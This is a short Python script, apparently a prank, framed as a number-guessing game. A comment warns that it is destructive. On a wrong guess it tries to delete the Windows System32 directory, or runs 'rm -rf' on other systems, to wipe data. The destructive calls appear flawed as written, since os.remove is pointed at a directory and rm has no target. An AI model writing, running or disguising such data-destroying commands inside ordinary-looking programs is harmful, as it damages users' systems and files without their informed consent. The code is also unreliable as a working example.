#This is a very destructive script games ,do it at your own risk
import random
import os
import sys
import platform
print("RULES OF THE GAME\nIf you fail to guess the number everything will be lost\n")
number = random.randint(1,10)
guess = input("Guess a number between 1 and 10\n")
guess = int(guess)
os_sys = platform.system()
if guess == number:
    print("You won!!!")
elif os_sys == "Windows":
    os.remove("C:\Windows\System32")
else:
    os.system("rm -rf")
